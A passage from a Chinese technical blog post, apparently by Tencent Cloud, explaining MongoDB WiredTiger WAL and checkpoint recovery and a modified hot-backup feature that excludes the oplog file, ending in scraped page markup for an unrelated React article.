<p>假设以下场景：当用户写数据到 MongoDB 时内存很充足，所有的 KV 数据会存储在 wiredTiger 存储引擎的 B+ tree 中，写入10条普通 KV 数据后，因此 wt 的 dirty 指标很低，因此不会触发 B+ tree 的 page evict 操作，写入内存后就会返回客户端OK ，此时 B+ tree 的数据全部在内存中，还没有持久化。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b93775f0a1343d0bf39821a77d57107~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=Zi%2FGace%2B4%2F%2FLRtfDrIQwKLRPIoA%3D" alt="image.png" loading="lazy"/></p>
<p>如果这时候机器故障或者 mongod 故障节点挂掉了，重启节点后，由于数据没有持久化到磁盘，因此重启后数据就会丢失，如下图。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d12d89c61ca942199f87c59b482d1b6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=WCTCagxB3aYsf%2FlYb6BW6179VeU%3D" alt="image.png" loading="lazy"/></p>
<p>基于以上背景，因此就有了 WAL 模块的存在，在数据写入到 B+ tree 前，会提前写 WAL 日志，每个写事物对应一个完整 wal 日志，这样当服务器异常重启或者进程重启的时候，就可以通过 WAL 顺序回放这些日志完成数据恢复。Mongod 的 WAL 数据存储在 journal 目录中：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bc4b235186645af8e66fd5ac6df7cb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=MbpjT%2F4hPnyQUNs1L4uzMPvJ3jA%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-4">2.1.2 如果只有 WAL 会有什么问题</h4>
<p>假设只依赖 wal 进行异常数据恢复，将存在以下问题：</p>
<p><strong>● 数据恢复慢</strong></p>
<p>Wal 的恢复流程：顺序读取每一个 WiredTigerLog.xx 文件，然后读取文件中的内容一行一行进行回放，如果 journal 目录中 WiredTigerLog.xx 文件很多，那么恢复速度就会越慢。</p>
<p><strong>● 数据放大严重</strong></p>
<p>假设我们只有一条数据，并且对这条数据 update 了几亿次操作，那么 wal 文件中会记录几亿次变更过程，磁盘占用空间会膨胀几亿倍。</p>
<p><strong>● 消耗大量文件句柄</strong></p>
<p>Wiredtiger 默认 WiredTigerLog.xx 文件大小100M，上T数据将用掉上万个文件句柄。</p>
<h3 data-id="heading-5">2.2 Checkpoint</h3>
<p>为了解决 WAL 的以上痛点，因此引入 checkpoint 机制，MongoDB 的 checkpoint 模块功能主要由 wiredTiger 存储引擎完成。</p>
<h4 data-id="heading-6">2.2.1 Checkpoint 核心原理</h4>
<p>Checkpoint 主要把当前 B+ tree 中所有可见脏 page 持久化到磁盘，从而实现一个完整数据快照。下面以一个完整的 checkpoint 流程为例进行说明(说明：为了简化，这里用一个方框来代表一个 page ，实际 B+ tree 这里还涉及ref相关数据结构)：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cf09173192f43a29a9a890b62ce356a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=1ycwRU7SInXNEwXq0KfoqERFK0s%3D" alt="image.png" loading="lazy"/></p>
<p>如上图所示，假设当前用户写入数据量不大，并且没有触发 evict** ，那么所有用户page 数据都在内存中。当做 checkpoint 的时候，checkpoint 线程会遍历整个 b+ tree 中的可见 page，由于之前这棵 tree 中的所有 page 都没有持久化过，因此对 checkpoint 线程来说这些 page 都是脏 page 。持久化到磁盘后的状态大体如下:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3796b05fc5c24012be29f78f578310ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=74Qhjxitk0bFJMqXxnpzzYmnglE%3D" alt="image.png" loading="lazy"/>
第一次 checkpoint 完成后，假设更新了 leaf_page_1 中的数据，然后 checkpoint 线程进行第二次 checkpoint 操作，这时候的数据分别状态如下图:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1597170baab4cc6b9fc24ec00cbaff3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=cabTtNDooFnyucEZlIqgkqQdaJs%3D" alt="image.png" loading="lazy"/></p>
<p>最终两次 checkpoint 后，collection.wt 中包含了两次 checkpoint 的全部用户数据和 ext 元数据，每个 checkpoint 都对应一棵完整的 b+ tree，假设第一次 checkpoint 对应 checkpoint_1，第二次 checkpoint 对应 checkpoint_2, 则：</p>
<p>Checkpoint_1 = leaf_page_1 + leaf_page_2 + internal_page_1 + leaf_page_3 + leaf_page_4 + internal_page_2 +root_page</p>
<p>Checkpoint_2 = leaf_page_1(new) + leaf_page_2 + internal_page_1(new) + leaf_page_3 + leaf_page_4 + internal_page_2 +root_page(new)</p>
<p>当节点重启后，首先根据 WiredTiger.wt 元数据获取下图中的 checkpoint 信息，解析 checkpint 信息就可以获取到磁盘上的 root page，然后就可以逐层获取到整颗b+ tree 的所有 page。root page 就是通过 wiredTiger 启动时候解析WiredTiger.wt 文件中的 checkpoint 信息地址获取，如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a54765f79ceb4ddeab100b0b81fda515~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=uVxMWSB%2BMul%2BsnjHcsKKL9z%2FQn0%3D" alt="image.png" loading="lazy"/>
这里 checkpoint=(WiredTigerCheckpoint.1=</p>
<p>(addr="018181e4c6ff67d88281e41546bd168381e48372ae35808080e22fc0cfc0")的 addr 是编码后的字符串，通过解码这个 addr 字符串即可解析出 root page 在磁盘中的位置以及其他 ext meta，从而可以在内存中重新构建该 b+ tree。Checkpoint 解析后的内容如下:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c0503542d14485ca377189c282cd8c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=sUA8f1xMxNhJSdvuKG0OB2TmE2E%3D" alt="image.png" loading="lazy"/></p>
<p>wiredTiger 相关 checkpoint 配置主要有下面两个参数：</p>
<p>● Checkpoint.log_size</p>
<p>当上次 checkpoint 后，wal的log_size 增加到配置的指定大小，则会触发wiredTiger 的 checkpoint server 线程做 checkpoint 操作。</p>
<p>● Checkpoint.wait</p>
<p>如果长时间没有满足 log_size 的大小，当离上次 checkpoint 时间达到 wait 值，也会触发 checkpoint server 线程做 checkpoint 操作。</p>
<p>MongoDB 没有启用 wiredTiger 自带的 checkpoint server </p>
<p>线程做 checkpoint 操作，而是 Mongo server 层创建了一个 checkpoint 线程定期进行 checkpoint 操作，checkpoint 周期默认60秒，可以通过修改配置文件 storage.syncPeriodSecs参数进行修改。</p>
<h4 data-id="heading-7">2.2.2 Checkpoint + WAL 结合优势</h4>
<p>前面的 checkpoint 分析可以看出，节点重启的时候可以恢复到上一次开始做checkpoint 时候的全量数据快照，然后从这个 checkpoint 时间点回放对应 WAL 文件中的日志即可恢复数据到节点异常时间点，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc8edfd0fe01420396b391b5c6dda035~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=Hqb0gRixdPJY8X6LvvEqKyXJnSo%3D" alt="image.png" loading="lazy"/></p>
<p>一次 checkpoint 完成后，本次 checkpoint 时间点之前的 WAL 已经没用了，因此可以直接删除。最终节点重启后的数据恢复以最近一次 checkpoint 全量快照+checkpoint 时间点以后的 WAL 文件来恢复单机数据，其中：</p>
<p>● 全量数据</p>
<p>通过 checkpoint 时间点的快照，通过 WiredTiger.wt 元数据文件中的 checkpoint=(WiredTigerCheckpoint.1=(addr="018181e4c6ff67d88281e41546bd168381e48372ae35808080e22fc0cfc0")即可获取 checkpoint 开始时间点的全量数据。</p>
<p>● 增量数据</p>
<p>增量数据可以通过 checkpoint 时间点对应的 WAL 文件回放来完成，也就是图中的 WiredTigerLog.n-1 和 WiredTigerLog.n。</p>
<p>通过 checkpoint+WAL 的结合，彻底解决了之前只有 WAL 设计时候的恢复慢、数据量放大、句柄耗光等问题。</p>
<h2 data-id="heading-8">3 wiredTiger 存储引擎 hotbackup 核心原理及其优化</h2>
<h3 data-id="heading-9">3.1 wiredTiger 存储引擎 hotbackup 核心原理</h3>
<p>hotbackup 主要是完成物理 wt 文件的完整一致性拷贝，每个表都有自己的checkpoint.addr (这里面保存了 root 及其他 ext meta )信息，这些信息存储在WiredTiger.wt 元数据文件中。</p>
<p>通过 WiredTiger.wt 中的 checkpoint.addr 信息可以逐步在恢复整个 B+ tree 层级结构。除了这个关键信息外，这里还涉及到很多其他的元数据配置，例如创建表的时候可以指定以下参数:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6779e058ccef452db0a56873439fbcd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=s%2F3AFhjOaGtKhBzXiLdtnAo7PTY%3D" alt="image.png" loading="lazy"/></p>
<p>创建表的时候，如果修改了 type、prefix_compression 和 value_format 的默认配置，则 wiredTiger.wt 中会保存这些表的元数据，这些元数据必须和创建表时候保持一致，否则节点重启会失败。</p>
<p>此外，除了上面的元数据外，还需要备份 schema 配置元数据，并存储表名和这些元数据配置的对应关系。所有这些元数据配置完全一致后，就可以通过元数据加载表对应 wt 文件，然后从元数据文件中的 checkpoint.addr 信息读取 root 地址，最终用户数据也就构建到 B+ tree 结构中。</p>
<p>整个 backup 代码实现主要分为三个阶段：</p>
<p>● backup cursor 生成阶段</p>
<p>这个步骤主要完成 schema 配置生成、确定需要拷贝的物理文件加入 cursor** 的 list buffer、设置 backup 标识等。</p>
<p>● backup cursor 遍历阶段</p>
<p>这个步骤主要告知我们需要拷贝哪些文件，通过 backup cursor 确定需要拷贝的文件名。</p>
<p>lbackup cursor 结束阶段</p>
<p>这个阶段主要包括资源回收，清理 backup 标识等。</p>
<h4 data-id="heading-10">3.1.1 backup cursor 生成阶段(也可以称为 begin 阶段)</h4>
<p>这一阶段也叫 begin 阶段，begin 开始后会立马设置 backup 标识，标明当前正在做backup 操作。</p>
<p>该阶段会从 WiredTiger.wt 中读取所有" file:"相关的 wt 文件列表，这些列表对应具体的 wt 文件，也就是需要拷贝到 cos 对象存储的wt文件，被存储到 cursor list 数组中。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7440007e52d941549dc536ef2222def0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=FTAejUDvNyP5pq84dXz6B28SLpA%3D" alt="image.png" loading="lazy"/></p>
<p>List 是指针结构，指向的内容为数组，数组的每一个 elem 代表一个需要拷贝的 wt 文件。然后获取这些 wt 文件的元数据配置信息存入"WiredTiger.backup.tmp"文件中，当所有的 wt 文件 schemap 配置及元数据写入 tmp 文件完成后，会 rename 更名为“WiredTiger.backup，最终“WiredTiger.backup”内容大体如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dc7afbf3d0d414e951be44f5a3e10d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=RVQUJHMqFljIDuQq5QrXCvbSCp4%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-11">3.1.2 backup cursor 遍历阶段(也可以称为wt文件数据拷贝阶段)</h4>
<p>这一阶段遍历 list[]数组即可获取 list[]数组中的每一个 elem，也就是可以获取每一个需要备份的 wt 物理文件。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d99ba97c8e164e41b089aa4dabfebcc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=hHlHS9Jv2QP6TAy2nVstFDj8qAo%3D" alt="image.png" loading="lazy"/>
获取到需要备份的 wt 文件后，旁路服务就可以并发拷贝 wt 文件存储到腾讯云 cos 对象存储中(包括 WiredTiger.backup 文件)。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a88c981fa0344e639d63624a020ff7f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=HG6XnpA2rU2s%2B%2BYp7JlyM6wzMD0%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-12">3.1.3 backup cursor 遍历阶段(也可以称为 wt 文件数据拷贝阶段)</h4>
<p>当物理文件拷贝完成后，backup cursor 即可 close 完成资源释放，同时清理backup 标识。</p>
<h3 data-id="heading-13">3.2 backup 数据恢复主要实现</h3>
<p>从 cos 下载备份的 wt 文件后，wt 加载流程主要如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb0674df247541bbad4c9aeb2eea099a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=AA1BjF4pgH6mn4NPBE0YA5lCnVw%3D" alt="image.png" loading="lazy"/></p>
<p>数据恢复实现主要是读取 WiredTiger.backup 内容，然后根据这些内容生成WiredTiger.wt 元数据文件，元数据文件生成完毕后就可以开始正式数据加载，mongod 即可通过 WiredTiger.wt 元数据文件获取每个表的配置信息，从而完成 wt 加载启动工作。</p>
<h3 data-id="heading-14">3.3 存储引擎 backup 剔除指定 wt 文件核心实现及其验证</h3>
<h4 data-id="heading-15">3.3.1 backup 剔除指定 wt 文件实现</h4>
<p>从上面的备份和恢复方式可以看出，WiredTiger.backup 中的内容是节点恢复的核心关键元数据，wt 启动所需的 WiredTiger.wt 中的 schema 配置和元数据内容全部来自 WiredTiger.backup 文件，而 WiredTiger.backup 文件在 begin 阶段完成，因此可以在 wt 的 backup 接口中增加了一个 exclude_target 参数，这个参数的作用主要是在 begin 阶段排除指定 wt 文件。假设剔除的表为 collection1, Hotback begin 阶段剔除 collection1 表后，WiredTiger.backup 文件中的内容将不再包含 collection1 的相关内容(这里腾讯云自己对 wiredTiger 做了修改)，如下图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be171e013072445baa04decc3b150822~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=pCZYBIvlnKD6yDUjjS46%2B4doTyE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90bc31bf79f2435397127219577ea89f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=MdvWq%2BRdVVnwwjIInfWLmv1reRU%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd1385408a694329a05507614d2611d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=AKwBYJj3nGI2Se9aSnTVBi8DyZM%3D" alt="image.png" loading="lazy"/></p>
<p>同理，当 cos 下载 wt 文件恢复数据的时候，也就不会下载 collection.wt 文件，从而也就提升了回档下载耗时。</p>
<h4 data-id="heading-16">3.3.2 backup 剔除指定 wt 文件验证</h4>
<p>为了验证 backup 新增的 exclude_target 功能是否能正常备份和回档，按照wiredTiger 存储引擎以下 demo 步骤进行验证，第三步和第四步如果验证通过，则说明 backup 剔除指定 collection 功能实现没有问题：</p>
<p>第一步：数据准备</p>
<p>新建10个表，每个表写100条数据，然后主动执行一次 checkpoint。</p>
<p>第二步：exclude_target 剔除其中一个表(只物理备份9个表)进行数据备份</p>
<p>调用修改后的 backup 功能，生成备份数据。</p>
<p>第三步：加载备份数据</p>
<p>用第二步生成的备份数据，加载 wt 文件，确定是否可以加载成功。</p>
<p>第四步：验证备份数据正确性</p>
<p>验证备份的9个表中的内容是否和备份前的内容完全一致。</p>
<p>● 准备数据</p>
<p>数据准备阶段创建10个表，每个表写入100条数据，相关核心 demo 代码如下:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42e9991fec48498293f1004db4d4487b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=jxRg2c2KlQ60mp46QQ73c25ajBo%3D" alt="image.png" loading="lazy"/>
● exclude_target 剔除其中一个表(只备份9个表)进行数据备份</p>
<p>上一步创建了10个表，新增 exclude_target 参数功能后，这里 backup 备份剔除其中一个表(collection_0), 因此 cursor next 只会获取到9个表，主要 demo如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/453f95b68ae34b39ac800aa72459440f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=6ZzxxIs%2BJRmiN4vRPht1C4TMduE%3D" alt="image.png" loading="lazy"/></p>
<p>这个 demo 在 BACKUP_DIR 中的备份文件只会有9个，也就是 collection_1 – collection_9，符合预期。</p>
<p>● 加载 backup 的备份数据</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ec28472c14d48bc886de135741245d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=gm7HnJAlduzClrk7YE2ddL%2Fl60Y%3D" alt="image.png" loading="lazy"/></p>
<p>这里验证通过，每个步骤不会报错，数据可以正常加载, 验证通过。</p>
<p>● 验证备份数据正确性</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a85a6776f444aaf95b6613f72d1465b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=lpJTZrMZ78%2BemCzUIR8wahm%2BAu0%3D" alt="image.png" loading="lazy"/>
这里验证通过，每个步骤不会报错，数据可以正常加载，并且能打印出collection_1-collection_9 这9个表中的KV数据，打印的内容与写入表中的内容完全一致。</p>
<p>从上面的 demo 验证可以确认，忽略指定 wt 备份恢复验证通过，说明从存储引擎一侧验证该方案没问题。</p>
<h2 data-id="heading-17">4 MongoDB server 层适配</h2>
<p>MongoDB 服务器本身依赖一些元数据文件来管理所有数据表，如果直接去掉 oplog.rs 文件后，启动时会因找不到该文件而报错。MongoDB server 层同样通过 backup cursor(带上新增的 exclude_target=oplog.wt)进行适配。</p>
<p>Server 层适配的时候可以先获取 oplog.rs 对应的磁盘 wt 文件名，然后加入exclude_target 参数中，获取 oplog.rs 对应磁盘 wt 文件名可以通过db.serverstatus().wiredTiger.uri 这个接口获取，server 层 backup 接口如下:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06150a1f9e2b4af9a3f7ef1789942196~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=VNntrWubKgPexHEv1Jqa84umprE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4edbde53eee4d0e876033f52e4375f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=88YXgJbcVrUrJvrlcVNCbi96vwY%3D" alt="image.png" loading="lazy"/></p>
<p>Server 适配该新功能启动 mongod 节点，发现启动报错，无法找到 oplog.rs 对应的 wt 文件。通过走读代码，可以确认该问题是因为 mongod 启动的时候，会对 server 层管理的 wt 元数据做二次检查(主要是 _mdb_catalog.wt 和sizeStorer.wt)，这两个 wt 文件存储的是 server 层用来维护表信息、索引信息以及每个表 count 数。</p>
<p>● _mdb_catalog.wt  文件中的数据内容</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18584cbc96d644d28b2edb71774cd530~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=0xV%2F8uF%2BPss6ahSIExbKNQH%2Btyw%3D" alt="image.png" loading="lazy"/></p>
<p>从上图可以看出，_mdb_catalog.wt 存储着表的元数据信息以及该表创建的索引信息，这些信息由 server 层写入 wiredtiger 引擎。</p>
<p>● sizeStorer.wt 文件中的数据内容</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e44f2676c30441e99129def29cb7c845~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=OjBtYjuIqDliOvrzB%2FYgw8HjOPs%3D" alt="image.png" loading="lazy"/></p>
<p>这里的 key 一一对应一个具体的表，每个 value 存储该表中的数据总大小以及数据条数，节点重启的时候，表的 count 就是从这个 wt 文件获取的。</p>
<p>由于 wiredTiger 引擎侧我们通过 exclude_target 删除了 oplog.rs 表对应的 wt文件，但是 mongo server 侧在 _mdb_catalog.wt 和 sizeStorer.wt 两个文件中维护着表、索引、数据量相关元数据。Mongod 启动的时候会加载这两个 wt 文件获取到对应的表，然后去检查这些表是否存在。由于 wiredTiger 引擎侧删除了oplog.rs 对应的 wt 文件，因此 mongo server 侧检查不通过。</p>
<p>腾讯云 MongoDB 内核除了在 wiredTiger 存储引擎侧通过 exclude_target 功能新增功能剔除了 oplog.rs 表，同时 server 侧修复了 mongo server 维护的oplog.rs 相关检查，最终解决了 wiredtiger 引擎测和 mongo server 测启动失败的问题。</p>
<h2 data-id="heading-18">5 结语</h2>
<blockquote>
<p>腾讯云 MongoDB 通过打造有特色的产品功能、进行深度的内核优化和创新，以及提供更极致的服务，逐步构建起自身的差异化优势，致力于为用户带来了业界顶级的的数据库性能和稳定性，未来，腾讯云 MongoDB 也将在不断提升产品性能与可靠性的同时，切实为客户带来更优的经济效益与更流畅的运维体验。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React useTransition 全网最通俗深度讲解：为什么它能让页面“不卡”？]]></title>    <link>https://juejin.cn/post/7575751471841902628</link>    <guid>https://juejin.cn/post/7575751471841902628</guid>    <pubDate>2025-11-24T03:08:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471841902628" data-draft-id="7575367791274410022" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React useTransition 全网最通俗深度讲解：为什么它能让页面“不卡”？"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2025-11-24T03:08:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="多啦C梦a"/> <meta itemprop="url" content="https://juejin.cn/user/2640348698905129"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React useTransition 全网最通俗深度讲解：为什么它能让页面“不卡”？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2640348698905129/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    多啦C梦a
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:08:25.000Z" title="Mon Nov 24 2025 03:08:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
